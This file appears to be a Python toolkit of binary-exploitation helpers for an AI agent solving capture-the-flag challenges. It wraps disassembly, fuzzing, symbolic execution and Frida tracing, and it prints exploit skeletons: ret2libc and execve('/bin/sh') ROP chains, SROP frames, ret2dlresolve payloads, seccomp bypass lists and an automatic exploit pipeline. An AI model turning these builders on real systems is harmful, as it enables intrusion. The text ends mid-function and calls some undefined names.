"""Binary exploitation and pwn tools."""
from __future__ import annotations
import re, subprocess, struct, os, shutil
import shlex
import json
from tools.shell import _shell, _w2l, IS_WINDOWS, USE_WSL, tool_execute_python


def tool_binary_analysis(path, operation, args=None):
    """Advanced binary analysis — disassembly, decompilation, checksec, GDB."""
    sp = _w2l(path) if (IS_WINDOWS and USE_WSL) else path
    sp_q = shlex.quote(str(sp))
    py_sp = json.dumps(str(sp))
    args = args or ""
    if operation == "checksec":
        return _shell(f"checksec --file={sp_q} 2>/dev/null || python3 -c \"import pwn; print(pwn.ELF({py_sp}).checksec())\" 2>/dev/null")
    if operation == "disassemble":
        return _shell(f"objdump -d -M intel {sp_q} | head -200")
    if operation == "disassemble_func":
        return _shell(f"objdump -d -M intel {sp_q} | grep -A 100 '<{args}>:' | head -60")
    if operation == "functions":
        return _shell(f"nm {sp_q} 2>/dev/null; objdump -t {sp_q} 2>/dev/null | grep -i 'F\\|f' | head -40")
    if operation == "plt_got":
        return _shell(f"objdump -d {sp_q} | grep -A3 '@plt'")
    if operation == "decompile_r2":
        return _shell(f"r2 -q -c 'aaa; s main; pdf' '{sp}' 2>/dev/null || echo 'r2 not found'", timeout=30)
    if operation == "decompile_ghidra":
        return _shell(f"ghidra_headless /tmp ghidra_tmp -import '{sp}' -postScript DecompileScript.java -deleteProject 2>/dev/null | head -100 || echo 'Ghidra headless not configured'", timeout=120)
    if operation == "rop_gadgets":
        return _shell(f"ROPgadget --binary {sp_q} --rop 2>/dev/null | head -60 || ropper -f {sp_q} 2>/dev/null | head -60")
    if operation == "rop_find":
        return _shell(f"ROPgadget --binary {sp_q} --rop --re {shlex.quote(str(args))} 2>/dev/null | head -30")
    if operation == "libc_version":
        return _shell(f"strings {sp_q} | grep 'GNU C Library'; ldd {sp_q} 2>/dev/null")
    if operation == "gdb_run":
        script = args or "run\nbt\ninfo registers\nq"
        with open("/tmp/gdb_script.txt","w") as f: f.write(script)
        return _shell(f"gdb -batch -x /tmp/gdb_script.txt '{sp}' 2>&1 | head -80", timeout=30)
    if operation == "pwndbg_cyclic":
        length = int(args or 200)
        return tool_execute_python(f"""
from pwn import cyclic, cyclic_find
pattern = cyclic({length})
print("Cyclic pattern:", pattern.decode())
print("\\nTo find offset after crash: cyclic_find(0x<crash_addr>)")
""")
    if operation == "format_string_offsets":
        return tool_execute_python("""
# Format string offset finder skeleton
# Connect to service and send %p%p%p... to find stack offsets
from pwn import *
# io = remote('host', port)  or  io = process('./binary')
# io.sendline(('%{}$p'.format(i)).encode()) to test each offset
print("Format string offset testing:")
print("Send: %1$p.%2$p.%3$p.%4$p.%5$p to see first 5 stack values")
print("When you see your input on the stack = that is your offset")
print("Then: %<offset>$s to read strings, %<offset>$n to write")
""")
    if operation == "heap_analysis":
        return _shell(f"gdb -batch -ex 'run' -ex 'heap chunks' -ex 'heap bins' '{sp}' 2>/dev/null | head -60")
    return f"Unknown operation. Available: checksec,disassemble,disassemble_func,functions,plt_got,decompile_r2,rop_gadgets,rop_find,libc_version,gdb_run,pwndbg_cyclic,format_string_offsets,heap_analysis"


def tool_unicorn_emulate(arch: str = "x86_64", shellcode_hex: str = "",
                          code_addr: int = 0x1000, code: str = "",
                          registers: dict = None, timeout: int = 60) -> str:
    """
    Unicorn CPU emulator — safely run shellcode/bytecode for any arch.
    Supports: x86, x86_64, arm, arm64/aarch64, mips.
    shellcode_hex: hex bytes to load at code_addr.
    code: extra Unicorn Python after setup (uc available).
    registers: {reg_name: value} to set before emulation.
    """
    arch_map = {
        "x86":    ("UC_ARCH_X86","UC_MODE_32","x86"),
        "x86_64": ("UC_ARCH_X86","UC_MODE_64","x86"),
        "arm":    ("UC_ARCH_ARM","UC_MODE_ARM","arm"),
        "arm64":  ("UC_ARCH_ARM64","UC_MODE_ARM","arm64"),
        "aarch64":("UC_ARCH_ARM64","UC_MODE_ARM","arm64"),
        "mips":   ("UC_ARCH_MIPS","UC_MODE_MIPS32","mips"),
    }
    a, m, cm = arch_map.get(arch.lower(), ("UC_ARCH_X86","UC_MODE_64","x86"))
    regs_code = ""
    if registers:
        for rn, rv in (registers or {}).items():
            regs_code += f"\n    uc.reg_write(uc_const.UC_{cm.upper()}_REG_{rn.upper()}, {rv})"
    user_code = code or (
        f"uc.emu_start(CODE_ADDR, CODE_ADDR+len(code_bytes), timeout=5*UC_SECOND_SCALE, count=10000)"
        if shellcode_hex else "print('Provide shellcode_hex or code=')"
    )
    full = f"""
try:
    from unicorn import *; from unicorn import {cm}_const as uc_const
    CODE_ADDR={code_addr}
    code_bytes=bytes.fromhex("{shellcode_hex}") if "{shellcode_hex}" else b""
    uc=Uc({a},{m})
    uc.mem_map(CODE_ADDR&~0xfff, 4*1024*1024)
    if code_bytes: uc.mem_write(CODE_ADDR, code_bytes)
    uc.mem_map(0x100000, 4*1024*1024)  # stack region
    {regs_code}
    if '{arch}' in ('x86_64','x86'):
        sp=uc_const.UC_X86_REG_RSP if '64' in '{arch}' else uc_const.UC_X86_REG_ESP
        uc.reg_write(sp, 0x300000)
    log=[]
    def hc(uc,a,s,u): log.append(hex(a)); (uc.emu_stop() if len(log)>500 else None)
    def hm(uc,ac,a,s,v,u):
        t={{UC_MEM_READ_UNMAPPED:"R",UC_MEM_WRITE_UNMAPPED:"W",UC_MEM_FETCH_UNMAPPED:"F"}}
        print(f"[MEM] {{t.get(ac,'?')}} at {{hex(a)}}"); return False
    uc.hook_add(UC_HOOK_CODE,hc); uc.hook_add(UC_HOOK_MEM_INVALID,hm)
    {user_code}
    print(f"Executed {{len(log)}} instructions | trace: {{log[:20]}}")
    if '{cm}'=='x86':
        for r in (['RAX','RBX','RCX','RDX','RSI','RDI','RIP','RSP'] if '64' in '{arch}' else ['EAX','EBX','ECX','EIP','ESP']):
            try: print(f"  {{r}}={{hex(uc.reg_read(getattr(uc_const,'UC_X86_REG_'+r)))}}")
            except: pass
except ImportError: print("pip install unicorn")
except UcError as e: print(f"UcError: {{e}}")
except Exception as e:
    import traceback; traceback.print_exc()
"""
    return tool_execute_python(full, timeout=timeout)


def tool_custom_cpu_emulate(code, operation, **params):
    """
    Framework for emulating custom CPU architectures.
    From Pachinko Revisited: extract bitwise XOR operations from WASM decompile,
    map I/O ports, simulate clock cycles, dump registers.
    Claude writes the CPU simulation code directly; this tool executes it.
    """
    # This is mostly a wrapper around execute_python with helpful context injected
    ctx = f"""
# Custom CPU Emulation Framework
# Standard helpers available:

import copy, struct, sys
from collections import defaultdict

class BitView:
    '''View a bytearray as individual bits for CPU state simulation.'''
    def __init__(self, state):
        self._s = state
    def __getitem__(self, key):
        if isinstance(key, slice):
            start, stop = key.start or 0, key.stop or len(self._s)*8
            bits = [(self._s[i//8] >> (i%8)) & 1 for i in range(start, stop)]
            val = 0
            for b in reversed(bits): val = (val << 1) | b
            return val
        return (self._s[key//8] >> (key%8)) & 1
    def __setitem__(self, key, val):
        if isinstance(key, slice):
            start, stop = key.start or 0, key.stop or len(self._s)*8
            width = stop - start
            for i in range(width):
                byte_i = (start+i)//8; bit_i = (start+i)%8
                self._s[byte_i] = (self._s[byte_i] & ~(1<<bit_i)) | (((val>>i)&1)<<bit_i)
        else:
            byte_i = key//8; bit_i = key%8
            self._s[byte_i] = (self._s[byte_i] & ~(1<<bit_i)) | ((val&1)<<bit_i)

def to_signed16(n):
    return n - 65536 if n >= 32768 else n

def from_signed16(n):
    return n & 0xFFFF

# ── User code below ──────────────────────────────────────
{code}
"""
    if operation == "run":
        return tool_execute_python(ctx, timeout=params.get("timeout", 120))
    elif operation == "check":
        # Just syntax check
        try:
            compile(ctx, "<cpu_emulator>", "exec")
            return "Syntax OK"
        except SyntaxError as e:
            return f"Syntax error: {e}"
    return f"Unknown op. Available: run, check"


def tool_libc_lookup(leak_address: str, symbol: str = "puts",
                      extra_symbols: dict = None) -> str:
    """
    Look up libc version from a leaked function address via libc.rip.
    Returns matching libc versions with download links and key gadget offsets.
    Use after leaking a GOT/PLT address to get the exact libc for ret2libc.
    """
    try:
        import requests; requests.packages.urllib3.disable_warnings()
        # Normalize address
        addr = leak_address.strip()
        if addr.startswith("0x") or addr.startswith("0X"):
            addr_int = int(addr, 16)
        else:
            addr_int = int(addr)

        params = {symbol: hex(addr_int)}
        if extra_symbols:
            params.update({k: hex(int(v,16) if isinstance(v,str) and v.startswith("0x") else int(v))
                          for k,v in extra_symbols.items()})

        r = requests.post("https://libc.rip/api/find", json=params, timeout=10)
        data = r.json()

        if not data:
            return f"No libc found for {symbol}={hex(addr_int)}. Try a different leaked symbol."

        lines = [f"Found {len(data)} matching libc(s) for {symbol}={hex(addr_int)}:"]
        for lib in data[:5]:
            lines.append(f"\n  [{lib.get('id','')}] {lib.get('buildid','')} ({lib.get('version','?')})")
            lines.append(f"    Download: https://libc.rip/{lib.get('download_url','')}")
            # Key offsets
            syms = lib.get('symbols', {})
            for s in ['system', '__libc_system', 'execve', '/bin/sh', 'one_gadget',
                      'puts', 'printf', 'read', 'write', '__free_hook', '__malloc_hook']:
                if s in syms:
                    lines.append(f"    {s}: {hex(int(syms[s],16))}")

        lines.append(f"\nUsage in pwntools:")
        lines.append(f"  from pwn import *")
        lines.append(f"  libc = ELF('./libc.so.6')")
        lines.append(f"  libc.address = {symbol}_leak - libc.sym['{symbol}']")
        lines.append(f"  system = libc.sym['system']")
        lines.append(f"  binsh  = next(libc.search(b'/bin/sh'))")
        return "\n".join(lines)
    except ImportError:
        return "pip install requests"
    except Exception as e:
        return f"Libc lookup error: {e}"


def tool_angr_solve(binary_path: str, find_addr: str = "", avoid_addrs: list = None,
                    stdin_len: int = 64, custom_code: str = "", timeout: int = 120) -> str:
    """
    angr symbolic execution for automatic input synthesis.
    find_addr: hex address of success state (e.g. "0x401234")
    avoid_addrs: list of hex addresses to avoid (wrong branch, exit)
    stdin_len: length of stdin to symbolize
    custom_code: extra angr Python code (for complex setups)
    """
    sp = repr(binary_path)
    find_str  = f"find={find_addr}," if find_addr else ""
    avoid_repr = repr(list(avoid_addrs or []))
    avoid_str = ""
    if avoid_addrs:
        avoid_str = "avoid=avoid_values,"
    code = f"""
try:
    import angr, claripy
    proj = angr.Project({sp}, auto_load_libs=False)
    # Find good/bad addresses automatically if not specified
    main_addr = proj.loader.find_symbol('main')
    entry = proj.entry if not main_addr else main_addr.rebased_addr

    # Symbolize stdin
    flag = claripy.BVS('flag', {stdin_len}*8)
    state = proj.factory.entry_state(stdin=flag)

    # Constrain to printable ASCII
    for byte in flag.chop(8):
        state.add_constraints(byte >= 0x20, byte <= 0x7e)

    avoid_values = []
    for _raw in {avoid_repr}:
        try:
            avoid_values.append(int(str(_raw).strip(), 0))
        except Exception:
            print(f"Skipping invalid avoid addr: {{_raw}}")

    sm = proj.factory.simulation_manager(state)
    print(f"Starting angr exploration from {{hex(entry)}}")

    {"sm.explore(" + find_str + avoid_str + "timeout=" + str(timeout-10) + ")" if (find_addr or avoid_addrs) else "sm.explore(timeout=" + str(timeout-10) + ")"}

    if sm.found:
        sol = sm.found[0]
        flag_val = sol.solver.eval(flag, cast_to=bytes)
        print(f"Solution found: {{flag_val}}")
        # Also try to get stdout
        try:
            out = sol.posix.dumps(1)
            print(f"Program output: {{out}}")
        except: pass
    else:
        print(f"No solution found. States: {{sm}}")
        print("Try: specify find_addr/avoid_addrs, increase timeout, or use custom_code")

    {custom_code}

except ImportError:
    print("angr not installed. Run: pip install angr")
except Exception as e:
    import traceback
    print(f"angr error: {{e}}")
    traceback.print_exc()
"""
    return tool_execute_python(code, timeout=timeout)


def tool_frida_trace(binary_path: str, script: str = "", function_hooks: list = None,
                     pid: int = 0, timeout: int = 30) -> str:
    """
    Frida dynamic instrumentation for reverse engineering.
    Hooks functions, intercepts calls, dumps args/retvals, bypasses anti-debug.
    script: Frida JS code
    function_hooks: list of function names to auto-hook and log
    """
    if not script and function_hooks:
        hooks = "\n".join([f"""
Interceptor.attach(Module.findExportByName(null, '{fn}'), {{
    onEnter: function(args) {{
        console.log('[{fn}] args:', args[0], args[1], args[2]);
    }},
    onLeave: function(retval) {{
        console.log('[{fn}] ret:', retval);
    }}
}});""" for fn in function_hooks])
        script = hooks

    if not script:
        script = """
// Default: hook all interesting crypto/comparison functions
['strcmp','strncmp','memcmp','bcmp','MD5','SHA256','AES_encrypt'].forEach(fn => {
    try {
        var sym = Module.findExportByName(null, fn);
        if (sym) Interceptor.attach(sym, {
            onEnter: args => console.log('[' + fn + ']', args[0].readUtf8String?.() || args[0])
        });
    } catch(e) {}
});
"""
    script_file = f"/tmp/frida_script_{int(time.time())}.js"
    with open(script_file, "w") as f: f.write(script)

    if pid:
        cmd = f"frida -p {pid} -l '{script_file}' --no-pause -q 2>&1 & sleep {timeout}; kill %1 2>/dev/null"
    elif binary_path:
        sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
        cmd = f"frida '{sp}' -l '{script_file}' --no-pause -q 2>&1 & sleep {timeout}; kill %1 2>/dev/null"
    else:
        return "Provide binary_path or pid"

    out = _shell(cmd, timeout=timeout+5)
    if "command not found" in out or "not found" in out.lower():
        return ("Frida not installed. Install: pip install frida frida-tools\n"
                "Then: frida-ps -a to list running processes")
    return out[:4000]


def tool_heap_analysis(binary_path: str, operation: str, args: str = "") -> str:
    """Heap analysis: bins, chunks, tcache_key, safe_link_decode, arena."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    if operation == "bins":
        return _shell(f"gdb -batch -ex 'file {sp}' -ex 'run </dev/null' -ex 'heap bins' 2>&1 | head -80", timeout=20)
    if operation == "chunks":
        return _shell(f"gdb -batch -ex 'file {sp}' -ex 'run </dev/null' -ex 'heap chunks' 2>&1 | head -100", timeout=20)
    if operation == "tcache_key":
        return tool_execute_python(f"""from pwn import *\ne=ELF(\'{binary_path}\',checksec=False)\nprint(f\"arch={{e.arch}} pie={{e.pie}}\")\nprint(\"safe-link (>=2.32): fd_stored = target XOR (heap_base>>12)\")""")
    if operation == "safe_link_decode":
        enc = args.strip()
        return tool_execute_python(f"enc=int(\'{enc}\',16) if \'{enc}\'.startswith(\'0x\') else int(\'{enc}\')\nfor sh in range(12,25):\n    print(f\'shift={{sh}}: {{hex(enc^(enc>>sh))}}\')")
    if operation == "arena":
        return _shell(f"gdb -batch -ex 'file {sp}' -ex 'run </dev/null' -ex 'p main_arena' 2>&1 | head -60", timeout=20)
    return "Available: bins, chunks, tcache_key, safe_link_decode, arena"


def tool_kernel_info(operation: str, module_path: str = "", args: str = "") -> str:
    """Kernel recon: mitigations, kallsyms, module_symbols, gadgets, seccomp_dump."""
    if operation == "mitigations":
        out = []
        for f, label in [("/proc/sys/kernel/randomize_va_space","ASLR"),
                          ("/proc/sys/kernel/kptr_restrict","kptr_restrict"),
                          ("/proc/sys/kernel/dmesg_restrict","dmesg_restrict")]:
            out.append(f"{label}: {_shell(f'cat {f} 2>/dev/null').strip()}")
        out.append("CPU: " + _shell("grep -m1 flags /proc/cpuinfo | grep -oE 'smep|smap|pti'"))
        return "\n".join(out)
    if operation == "kallsyms":
        sym = args or "commit_creds"
        return _shell(f"grep -E '{sym}' /proc/kallsyms 2>/dev/null | head -20 || echo 'kptr_restrict=2, need leak first'")
    if operation == "module_symbols":
        return _shell(f"nm '{module_path}' 2>/dev/null | head -60 || strings '{module_path}' | head -40")
    if operation == "gadgets":
        return _shell(f"ROPgadget --binary '{module_path}' 2>/dev/null | grep -E 'swapgs|iretq|pop.*cr' | head -30")
    if operation == "seccomp_dump":
        return _shell(f"seccomp-tools dump '{module_path}' 2>/dev/null || echo 'gem install seccomp-tools'")
    return "Available: mitigations, kallsyms, module_symbols, gadgets, seccomp_dump"


def tool_seccomp_analyze(binary_path: str, operation: str = "dump") -> str:
    """Seccomp filter analysis and bypass path identification."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    out = _shell(f"seccomp-tools dump '{sp}' 2>/dev/null")
    if not out.strip() or "not found" in out.lower():
        out = ("seccomp-tools not found. Install: gem install seccomp-tools\n" +
               _shell(f"strings '{sp}' | grep -i seccomp") + "\n" +
               "Common seccomp bypasses: 32-bit ABI (int 0x80), process_vm_writev, openat vs open")
    if operation == "allowed":
        out += "\n\nBypasses: 32-bit ABI, process_vm_writev, open+read+write chain, openat, sendfile"
    return out


def tool_ret2dlresolve(binary_path: str, target_func: str = "system", arg: str = "/bin/sh") -> str:
    """ret2dlresolve: compute structure offsets and generate pwntools skeleton."""
    code = f"""from pwn import *
try:
    elf=ELF(\'{binary_path}\',checksec=False); context.binary=elf
    r=ROP(elf)
    dl=Ret2dlresolvePayload(elf,symbol=\'{target_func}\',args=[b\'{arg}\'])
    print(f"resolve_call: {{hex(dl.resolv_addr)}}")
    print(f"payload len: {{len(dl.payload)}}")
    print("\nUsage:\n  r.ret2dlresolve(dl)\n  payload=flat({{offset:r.chain()}})+dl.payload")
except Exception as e:
    print(f"{{e}}")
    print(_shell(f"readelf -d \'{binary_path}\' | grep -E STRTAB|SYMTAB|JMPREL"))"""
    return tool_execute_python(code)


def tool_srop(binary_path: str, operation: str = "frame", **params) -> str:
    """SROP/sigreturn: frame builder, find_syscall gadget, useful gadgets list."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    if operation == "frame":
        arch = params.get("arch","amd64")
        code = f"""from pwn import *
context.arch=\'{arch}\'
f=SigreturnFrame()
print(f"Frame size: {{len(bytes(f))}} bytes")
print("Set: f.rax=constants.SYS_execve, f.rdi=bin_sh, f.rip=syscall_addr")
print("Payload: flat({{offset:[syscall_ret, constants.SYS_rt_sigreturn, bytes(f)]}})")"""
        return tool_execute_python(code)
    if operation == "find_syscall":
        return _shell(f"ROPgadget --binary '{sp}' 2>/dev/null | grep -E 'syscall ; ret|int 0x80' | head -15")
    if operation == "gadgets":
        return _shell(f"ROPgadget --binary '{sp}' 2>/dev/null | grep -E 'pop rax|xor rax|mov rax' | head -20")
    return "Available: frame, find_syscall, gadgets"


def tool_afl_fuzz(binary_path: str, input_dir: str = "/tmp/afl_in",
                   output_dir: str = "/tmp/afl_out", timeout_ms: int = 100,
                   run_seconds: int = 60, extra_args: str = "") -> str:
    """AFL++ fuzzing. Returns crash summary for exploit generation pipeline."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    _shell(f"mkdir -p {input_dir} {output_dir}; echo AAAA > {input_dir}/s1; echo 1234 > {input_dir}/s2")
    out = _shell(f"timeout {run_seconds} afl-fuzz -i {input_dir} -o {output_dir} -t {timeout_ms} {extra_args} -- '{sp}' @@ 2>&1 | tail -20", timeout=run_seconds+15)
    if "not found" in out.lower():
        return "AFL++ not found. Install: sudo apt install afl++ OR github.com/AFLplusplus/AFLplusplus"
    crashes = _shell(f"ls {output_dir}/default/crashes/ 2>/dev/null | head -20")
    return f"{out}\nCrashes: {crashes}\nFeed to: angr_solve(binary_path=..., find_addr=crash_rip)"


def tool_patchelf(binary_path: str, libc_path: str = "", ld_path: str = "",
                   operation: str = "patch") -> str:
    """Patch binary to use specific libc/linker for local testing matching remote."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    if operation == "info":
        return _shell(f"patchelf --print-interpreter '{sp}' 2>/dev/null; patchelf --print-needed '{sp}' 2>/dev/null; ldd '{sp}' 2>/dev/null")
    if operation == "patch":
        if ld_path: _shell(f"patchelf --set-interpreter '{ld_path}' '{sp}'")
        if libc_path:
            soname = _shell(f"patchelf --print-soname '{libc_path}' 2>/dev/null").strip() or "libc.so.6"
            _shell(f"patchelf --replace-needed {soname} '{libc_path}' '{sp}'")
            _shell(f"patchelf --set-rpath $(dirname '{libc_path}') '{sp}'")
        return _shell(f"ldd '{sp}' 2>/dev/null") + "\nPatched — local binary now uses specified libc."
    if operation == "download_libc":
        return tool_execute_python(f"""import requests,os
r=requests.get(f'https://libc.rip/download/{libc_path}',stream=True,timeout=30); r.raise_for_status()
fname=f'/tmp/{libc_path}.so'
with open(fname,'wb') as f:
    [f.write(c) for c in r.iter_content(8192)]
os.chmod(fname,0o755); print(f'Downloaded: {fname}')""")
    return "Available: info, patch, download_libc"


def tool_deobfuscate(binary_path: str, operation: str = "detect", **params) -> str:
    """Binary deobfuscation: detect OLLVM/CFF, mba_simplify, decompile_miasm."""
    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    if operation == "detect":
        fc = _shell(f"r2 -q -c 'aaa;afl' '{sp}' 2>/dev/null | wc -l", timeout=20).strip()
        return (f"Function count: {fc}\n" +
                _shell(f"r2 -q -c 'aaa;afl~[3]' '{sp}' 2>/dev/null | sort -rn | head -10", timeout=20) +
                "\nHigh BB count + switch dispatcher = CFF. XOR-heavy = MBA. Use mba_simplify or decompile_miasm.")
    if operation == "mba_simplify":
        expr = params.get("expression","")
        return _shell(f"python3 -m msynth -e '{expr}' 2>/dev/null || echo 'pip install msynth OR pip install arybo'")
    if operation == "cff_detect":
        return _shell(f"r2 -q -c 'aaa;aflm' '{sp}' 2>/dev/null | awk '{{if($1>10)print}}' | head -20", timeout=30)
    if operation == "decompile_miasm":
        func = params.get("func_addr","")
        code = f"""try:
    from miasm.analysis.binary import Container
    from miasm.analysis.machine import Machine
    cont=Container.from_stream(open(\'{binary_path}\',\'rb\'))
    machine=Machine(cont.arch)
    mdis=machine.dis_engine(cont.bin_stream)
    addr=int(\'{func}\',16) if \'{func}\' else cont.entry_point
    asmcfg=mdis.dis_multiblock(addr)
    print(f\'Blocks: {{len(list(asmcfg.blocks))}}')
    for blk in list(asmcfg.blocks)[:8]:
        print(f\'  {{hex(blk.loc_key.offset or 0)}}: {{len(blk.lines)}} insns\')
except ImportError: print('pip install miasm')"""
        return tool_execute_python(code, timeout=60)
    return "Available: detect, mba_simplify, cff_detect, decompile_miasm"


def tool_triton_taint(binary_path: str, stdin_input: str = "", operation: str = "trace") -> str:
    """Triton symbolic taint analysis. Falls back to strace/ltrace if not installed."""
    if operation == "trace":
        stdin_bytes_repr = repr((stdin_input or "A"*64).encode())
        empty_repr = repr(b"")
        code = (f"""try:\n    from triton import *\n    ctx=TritonContext(ARCH.X86_64)\n"""
                f"""    ctx.setMode(MODE.ALIGNED_MEMORY,True)\n"""
                f"""    import lief; binary=lief.parse('{binary_path}')\n"""
                f"""    for seg in binary.segments:\n"""
                f"""        if seg.virtual_address: ctx.setConcreteMemoryAreaValue(seg.virtual_address,list(seg.content))\n"""
                f"""    stdin_bytes={stdin_bytes_repr}\n"""
                f"""    for i,b in enumerate(stdin_bytes): ctx.setConcreteMemoryValue(0x10000+i,b); ctx.taintMemory(0x10000+i)\n"""
                f"""    print(f'Triton ready. {{len(stdin_bytes)}} tainted bytes at 0x10000')\n"""
                f"""except ImportError:\n"""
                f"""    print('Triton not installed: pip install triton')\n"""
                f"""    import subprocess\n"""
                f"""    r=subprocess.run(['ltrace','-e','strcmp+memcmp+strncmp','{binary_path}'],"""
                f"""input={empty_repr},capture_output=True,timeout=10)\n"""
                f"""    print(r.stderr.decode(errors='replace')[:2000])""")
        return tool_execute_python(code, timeout=30)
    if operation == "strace":
        inp = repr(stdin_input.encode() if stdin_input else b"")
        return _shell(f"strace -e read,write,open,openat,execve -s 200 '{binary_path}' <<< '{stdin_input}' 2>&1 | head -50", timeout=15)
    return "Available: trace, strace"


def tool_aeg_pipeline(binary_path: str, operation: str = "run",
                       fuzz_seconds: int = 30, output_dir: str = "/tmp/afl_out") -> str:
    """Auto Exploit Generation: AFL++ fuzz → crash triage → angr input → exploit structure."""
    if operation == "run":
        log("sys","[AEG] Phase 1: fuzzing","bright")
        fuzz_out = tool_afl_fuzz(binary_path, "/tmp/afl_in", output_dir, run_seconds=fuzz_seconds)
        crash_dir = f"{output_dir}/default/crashes"
        crashes = _shell(f"ls {crash_dir}/ 2>/dev/null").strip().split()
        if not crashes or crashes == [""]:
            return f"No crashes in {fuzz_seconds}s.\n{fuzz_out}\nTry longer fuzzing or direct angr_solve."
        fc = crashes[0]
        crash_hex = _shell(f"xxd '{crash_dir}/{fc}' | head -10")
        crash_state = _shell(f"gdb -batch -q -ex 'run < {crash_dir}/{fc}' -ex 'info registers rip rsp' '{binary_path}' 2>&1 | grep -E 'rip|rsp|SIGSEGV' | head -8")
        checksec = _shell(f"checksec --file='{binary_path}' 2>/dev/null")
        return (f"Crashes: {len(crashes)}\nFirst: {crash_dir}/{fc}\n{crash_hex}\n"
                f"Crash state:\n{crash_state}\nProtections:\n{checksec}\n"
                f"Next: angr_solve(binary_path='{binary_path}', find_addr=<rip value>)")
    if operation == "triage":
        crash_dir = f"{output_dir}/default/crashes"
        crashes = _shell(f"ls {crash_dir}/ 2>/dev/null").strip().split()
        return "\n".join(_shell(f"gdb -batch -q -ex 'run <{crash_dir}/{c}' -ex 'info registers rip' '{binary_path}' 2>&1 | grep rip") for c in crashes[:8])
    return "Available: run, triage"


def tool_arm_rop(binary_path: str, operation: str = "chain",
                  libc_path: str = "", arch: str = "arm64",
                  goal: str = "shell", base_addr: str = "0") -> str:
    """ARM/MIPS/AArch64 ROP chain builder.
    Ops: chain (build full ROP chain for goal), gadgets (dump useful gadgets),
    checksec (protections), ret2libc (find system + /bin/sh in libc),
    syscall (build execve syscall chain for target arch)."""

    sp = _w2l(binary_path) if (IS_WINDOWS and USE_WSL) else binary_path
    lp = (_w2l(libc_path) if (IS_WINDOWS and USE_WSL) else libc_path) if libc_path else ""
    base = int(base_addr, 16) if base_addr.startswith('0x') else int(base_addr)

    if operation == "checksec":
        return _shell(f"checksec --file='{sp}' 2>/dev/null && file '{sp}'", timeout=10)

    if operation == "gadgets":
        arch_lower = arch.lower()
        if arch_lower in ("arm64", "aarch64"):
            return _shell(f"ROPgadget --binary '{sp}' --arch arm64 2>/dev/null | head -60 || "
                         f"ropper -f '{sp}' --arch AARCH64 2>/dev/null | head -60",
                         timeout=30)
        elif arch_lower == "arm":
            return _shell(f"ROPgadget --binary '{sp}' --arch arm 2>/dev/null | head -60 || "
                         f"ropper -f '{sp}' --arch ARM 2>/dev/null | head -60",
                         timeout=30)
        elif arch_lower in ("mips", "mipsel"):
            return _shell(f"ROPgadget --binary '{sp}' --arch mips 2>/dev/null | head -60 || "
                         f"ropper -f '{sp}' --arch MIPS 2>/dev/null | head -60",
                         timeout=30)

    code = f"""
try:
    from pwn import *
    context.log_level = 'error'
    elf = ELF({repr(sp)}, checksec=False)
    arch = {repr(arch.lower())}
    context.arch = arch if arch != 'arm64' else 'aarch64'
    base = {base}
    goal = {repr(goal)}
    lp = {repr(lp)}
    libc = ELF(lp, checksec=False) if lp else None

    rop = ROP(elf)
    print(f"Architecture: {{context.arch}}")
    print(f"Binary base: 0x{{base:x}}")

    if goal in ('shell', 'ret2libc') and libc:
        system = libc.sym.get('system', 0) + base
        binsh  = next(libc.search(b'/bin/sh'), 0) + base if libc else 0
        print(f"system @ 0x{{system:x}}")
        print(f"/bin/sh @ 0x{{binsh:x}}")

        if context.arch in ('aarch64', 'arm'):
            # ARM/AArch64: first arg in x0/r0
            gadgets = rop.gadgets
            pop_x0 = None
            for g in gadgets.values():
                if context.arch == 'aarch64' and 'x0' in str(g) and 'ret' in str(g).lower():
                    pop_x0 = g
                    break

            print("\\nAArch64 ROP chain skeleton (pwntools):")
            print(f"  # Need gadget: pop x0 (or x0, x1, ...) ; ret (or br x...)")
            print(f"  rop.call(0x{{system:x}}, [0x{{binsh:x}}])")
            print(f"  chain = rop.chain()")

    if goal in ('syscall', 'execve'):
        if context.arch == 'aarch64':
            print("\\nAArch64 execve syscall chain:")
            print("  x8 = 221 (execve syscall number)")
            print("  x0 = /bin/sh address")
            print("  x1 = 0 (argv)")
            print("  x2 = 0 (envp)")
            print("  svc #0")
            print("  Gadgets needed: pop x8; ret, pop x0; ret, svc #0; ret")
        elif context.arch == 'arm':
            print("\\nARM execve syscall chain:")
            print("  r7 = 11 (execve syscall number)")
            print("  r0 = /bin/sh address")
            print("  r1 = 0, r2 = 0")
            print("  swi #0 (or svc #0)")

    # Dump available gadgets
    print("\\nAvailable gadgets (top 20):")
    for addr, g in list(rop.gadgets.items())[:20]:
        print(f"  0x{{addr+base:x}}: {{g}}")

except ImportError:
    print("pwntools not available for ARM ROP")
    print(f"Manual approach: ROPgadget --binary '{sp}' --arch {arch}")
except Exception as ex:
    import traceback; traceback.print_exc()
"""
    return tool_execute_python(code, timeout=30)


def tool_asm_eval(code_or_path: str, operation: str = "eval",
                   arch: str = "x86_64", entry: str = "",
                   inputs: dict = None, steps: int = 0) -> str:
    """Evaluate/trace assembly code to compute register state.
    Critical for asm1-asm4 type challenges where you need the return value.
    Ops: eval (run snippet, dump final registers), trace (step-by-step with state),
    find_ret (find what value gets returned), decompile_snippet (lift to C-like pseudocode)."""

    arch_map = {
        "x86":    ("UC_ARCH_X86",  "UC_MODE_32",   "x86"),
        "x86_64": ("UC_ARCH_X86",  "UC_MODE_64",   "x86_64"),
        "arm":    ("UC_ARCH_ARM",  "UC_MODE_ARM",  "arm"),
        "arm64":  ("UC_ARCH_ARM64","UC_MODE_ARM",  "arm64"),
        "mips":   ("UC_ARCH_MIPS", "UC_MODE_MIPS32","mips"),
    }
    ua, um, uarch = arch_map.get(arch.lower(), arch_map["x86_64"])

    if operation in ("eval", "trace", "find_ret"):
        regs_init = inputs or {}
        code_py = f"""
import sys
asm_text = {repr(code_or_path)}
arch = {repr(arch.lower())}
op = {repr(operation)}
entry = {repr(entry)}
init_regs = {repr(regs_init)}
max_steps = {steps or 1000}

# Try keystone + unicorn approach
try:
    import keystone as ks
    import unicorn as uc
    import unicorn.x86_const as x86c
    import unicorn.arm_const as armc

    # Assemble
    arch_ks = {{
        'x86':    (ks.KS_ARCH_X86,   ks.KS_MODE_32),
